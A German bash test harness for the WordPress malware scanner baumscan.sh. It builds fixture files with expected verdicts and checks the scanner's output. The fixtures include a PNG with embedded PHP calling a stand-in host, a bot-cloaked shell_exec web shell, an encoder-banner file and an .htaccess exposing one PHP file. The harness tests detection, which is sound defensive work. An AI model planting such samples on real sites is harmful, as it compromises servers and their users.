#!/usr/bin/env bash
# =============================================================================
# baumscan-pruefstand.sh — prüft die Urteile von baumscan.sh
# =============================================================================
# Baut einen kleinen Baum, in dem für JEDE Datei feststeht, welches Urteil sie
# bekommen muss, lässt baumscan darüber laufen und vergleicht.
#
# Warum ein eigener Prüfstand: werkzeuge/goldmuster.sh prüft
# wp_plesk_forensik.sh gegen einen Referenzlauf. Die Urteile leben in
# baumscan.sh und werden davon nicht berührt.
#
# Warum Soll-Werte statt eines Referenzlaufs: bei einem Urteil ist die
# richtige Antwort vorher bekannt. Ein Referenzvergleich würde nur melden,
# DASS sich etwas geändert hat — hier soll er melden, dass etwas FALSCH ist.
#
# Die Prüfsummenquelle wird auf eine lokale Datei umgelenkt (curl kann
# file://). Sonst hinge der Test am Netz und an der Frage, ob wordpress.org
# eine bestimmte Fassung noch führt — UpdraftPlus 2.16.57.0 etwa liefert 404.
#
# Nutzung:  werkzeuge/baumscan-pruefstand.sh
# Rückgabe: 0 wenn alle Soll-Urteile erreicht wurden, sonst 1
# =============================================================================

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"
BAUMSCAN="${SELF_DIR}/werkzeuge/baumscan.sh"
ARBEIT="${BAUMSCAN_PRUEFSTAND_DIR:-${HOME}/.baumscan-pruefstand}"
BAUM="${ARBEIT}/baum"
QUELLEN="${ARBEIT}/pruefsummen"
LAEUFE="${ARBEIT}/laeufe"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'; NC='\033[0m'
ok()   { echo -e "  ${GRN}✓${NC} $1"; }
fehl() { echo -e "  ${RED}✗${NC} $1"; FEHLER=$((FEHLER+1)); }
info() { echo -e "  ${YLW}·${NC} $1"; }
FEHLER=0

# ── Baum bauen ──────────────────────────────────────────────────────────────
rm -rf "$ARBEIT"
mkdir -p "$BAUM" "$QUELLEN" "$LAEUFE"

PLUGIN="${BAUM}/httpdocs/wp-content/plugins/pruefstand-plugin"
mkdir -p "$PLUGIN/assets" "${BAUM}/httpdocs/wp-content/uploads"

# Hauptdatei des Plugins — hieraus liest baumscan Name und Fassung.
cat > "$PLUGIN/pruefstand-plugin.php" <<'PHP'
<?php
/*
Plugin Name: Pruefstand Plugin
Version: 1.0.0
*/
// Harmlose Hauptdatei ohne jedes Muster.
PHP

# Mitgelieferte Bibliothek — ebenfalls im Prüfsummensatz, ebenfalls harmlos.
mkdir -p "$PLUGIN/vendor/beispiel"
cat > "$PLUGIN/vendor/beispiel/lib.php" <<'PHP'
<?php
/*
 * Beispielbibliothek
 * Version: 9.9.9   <- Falle: frueher las baumscan hier die Fassung des
 *                      Plugins aus und fand deshalb keinen Pruefsummensatz.
 */
function pruefstand_beispiel() { return true; }
PHP

# SOLL: BEFALLEN — gültiges PNG mit PHP darin, ohne jedes Verdachtsmerkmal.
if [ "${NT_BAUMSCAN_OHNE_MEDIENPHP:-0}" != "1" ]; then
  printf '\x89PNG\r\n\x1a\n<?php $u="https://beispiel.invalid/n.php";$c=curl_init();curl_setopt($c,CURLOPT_URL,$u);curl_exec($c);\n' \
    > "$PLUGIN/assets/banner.png"
else
  printf '\x89PNG\r\n\x1a\nnur Bilddaten\n' > "$PLUGIN/assets/banner.png"
fi

# SOLL: BEFALLEN — Encoder-Banner, die Selbstbeschreibung einer kodierten Datei.
if [ "${NT_BAUMSCAN_OHNE_PACKER:-0}" != "1" ]; then
  cat > "${BAUM}/httpdocs/wp-content/uploads/gepackt.php" <<'PHP'
<?php
/* PHP Encoding by Miladworkshop PHP Encoder */
$a = "harmlos aussehender Rest";
PHP
else
  printf '<?php\n$a = "harmlos aussehender Rest";\n' > "${BAUM}/httpdocs/wp-content/uploads/gepackt.php"
fi

# SOLL: BEFALLEN — .htaccess, die genau eine PHP-Datei freigibt.
cat > "${BAUM}/httpdocs/wp-content/uploads/.htaccess" <<'HTA'
<FilesMatch "^(gepackt.php|index.php)$">
    Order allow,deny
    Allow from all
</FilesMatch>
HTA

# SOLL: TREFFER — offener shell_exec mit Bot-Ausblendung, keine Obfuskation.
cat > "${BAUM}/httpdocs/wp-content/uploads/werkzeug.php" <<'PHP'
<?php
$bots = ['Googlebot', 'bingbot', 'curl'];
if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) { exit; }
echo shell_exec('id');
PHP

# SOLL: KEIN — nichts angeschlagen, keine Referenz.
printf 'nur text, kein code\n' > "${BAUM}/httpdocs/liesmich.txt"
printf '\x89PNG\r\n\x1a\nechte Bilddaten ohne Code\n' > "${BAUM}/httpdocs/bild.png"

# SOLL: WIDERSPRUCH — im Prüfsummensatz UND mit Encoder-Banner.
# Der Sicherheitsnetz-Fall: er hat bei der Entwicklung eine falsche
# BEFALLEN-Regel entlarvt, bevor sie in einen Kundenbericht geraten konnte.
cat > "$PLUGIN/widerspruch.php" <<'PHP'
<?php
/* PHP Encoding by Miladworkshop PHP Encoder */
// Zugleich amtlich bestaetigt — das darf nicht stillschweigend aufgeloest werden.
PHP

# ── Prüfsummensatz erzeugen ────────────────────────────────────────────────
# Enthält bewusst NICHT banner.png: eine Datei, die nicht zum Lieferumfang
# gehört, muss als solche erkennbar bleiben.
mkdir -p "${QUELLEN}/pruefstand-plugin"
python3 - "$PLUGIN" "${QUELLEN}/pruefstand-plugin/1.0.0.json" <<'PY'
import hashlib, json, os, sys
wurzel, ziel = sys.argv[1], sys.argv[2]
dateien = {}
for rel in ["pruefstand-plugin.php", "vendor/beispiel/lib.php", "widerspruch.php"]:
    pfad = os.path.join(wurzel, rel)
    with open(pfad, "rb") as fh:
        dateien[rel] = {"md5": hashlib.md5(fh.read()).hexdigest()}
if os.environ.get("NT_BAUMSCAN_OHNE_PRUEFSUMME") == "1":
    dateien["pruefstand-plugin.php"]["md5"] = "0" * 32
json.dump({"files": dateien}, open(ziel, "w"))
PY

# ── Lauf ────────────────────────────────────────────────────────────────────
echo "Baumscan-Prüfstand"
echo "  Baum:    $BAUM"
echo "  Quellen: $QUELLEN"
echo

BAUMSCAN_BASE="$LAEUFE" \
BAUMSCAN_FP_LIST=/dev/null \
BAUMSCAN_PRUEFSUMMEN_BASIS="file://${QUELLEN}" \
bash "$BAUMSCAN" --online "$BAUM" >"${ARBEIT}/lauf.log" 2>&1
RUN=$(cat "${LAEUFE}/CURRENT" 2>/dev/null || true)
if [ -z "$RUN" ] || [ ! -s "$RUN/urteile.tsv" ]; then
  echo -e "  ${RED}✗${NC} Kein Lauf entstanden — siehe ${ARBEIT}/lauf.log"
  tail -20 "${ARBEIT}/lauf.log"
  exit 1
fi

# ── Soll gegen Ist ─────────────────────────────────────────────────────────
urteil_von() {
  awk -F'\t' -v p="$1" '$3==p {print $1; gefunden=1} END{if(!gefunden) print "FEHLT"}' \
    "$RUN/urteile.tsv" | head -1
}

pruefe() {   # <soll> <pfad> <warum>
  local soll="$1" pfad="$2" warum="$3" ist
  ist=$(urteil_von "$pfad")
  if [ "$ist" = "$soll" ]; then
    ok "$soll  ${pfad#$BAUM/}"
  else
    fehl "erwartet $soll, erhalten $ist  —  ${pfad#$BAUM/}"
    echo "      ($warum)"
  fi
}

echo "Urteile:"
pruefe BEFALLEN    "$PLUGIN/assets/banner.png"                        "PHP in gueltigem Bild, ohne Verdachtsmerkmal im Code"
pruefe BEFALLEN    "${BAUM}/httpdocs/wp-content/uploads/gepackt.php"  "Encoder-Banner = Selbstbeschreibung einer kodierten Datei"
pruefe BEFALLEN    "${BAUM}/httpdocs/wp-content/uploads/.htaccess"    "gibt gezielt eine einzelne PHP-Datei frei"
pruefe TREFFER     "${BAUM}/httpdocs/wp-content/uploads/werkzeug.php" "offener shell_exec — auslegungsbeduerftig, nicht beweiskraeftig"
pruefe SAUBER      "$PLUGIN/pruefstand-plugin.php"                    "amtliche Pruefsumme stimmt"
pruefe SAUBER      "$PLUGIN/vendor/beispiel/lib.php"                  "Pruefsumme stimmt — und die Fassung wurde aus der Hauptdatei gelesen"
pruefe KEIN        "${BAUM}/httpdocs/liesmich.txt"                    "nichts angeschlagen, keine Referenz"
pruefe KEIN        "${BAUM}/httpdocs/bild.png"                        "echtes Bild ohne Code"
pruefe WIDERSPRUCH "$PLUGIN/widerspruch.php"                          "Pruefsumme stimmt UND Encoder-Banner — darf nicht stillschweigend aufgeloest werden"

# ── Vollständigkeit: bekommt WIRKLICH jede Datei ein Urteil? ───────────────
echo
echo "Vollständigkeit:"
DATEIEN=$(find "$BAUM" -type f | wc -l | tr -d ' ')
URTEILE=$(wc -l < "$RUN/urteile.tsv" | tr -d ' ')
if [ "$DATEIEN" = "$URTEILE" ]; then
  ok "$URTEILE Urteile für $DATEIEN Dateien — lückenlos"
else
  fehl "$URTEILE Urteile für $DATEIEN Dateien — $((DATEIEN - URTEILE)) ohne Aussage"
fi

# SAUBER darf ausschliesslich aus der Prüfsumme stammen.
FREMD=$(awk -F'\t' '$1=="SAUBER" && $2 !~ /Prüfsumme/ {n++} END{print n+0}' "$RUN/urteile.tsv")
if [ "$FREMD" = "0" ]; then
  ok "SAUBER stammt ausschliesslich aus amtlichen Prüfsummen"
else
  fehl "$FREMD SAUBER-Urteile ohne Prüfsummen-Begründung"
fi

echo
if [ "$FEHLER" -eq 0 ]; then
  echo -e "${GRN}Alle Soll-Urteile erreicht.${NC}  Lauf: $RUN"
  exit 0
fi
echo -e "${RED}${FEHLER} Abweichung(en).${NC}  Lauf: $RUN  Log: ${ARBEIT}/lauf.log"
exit 1
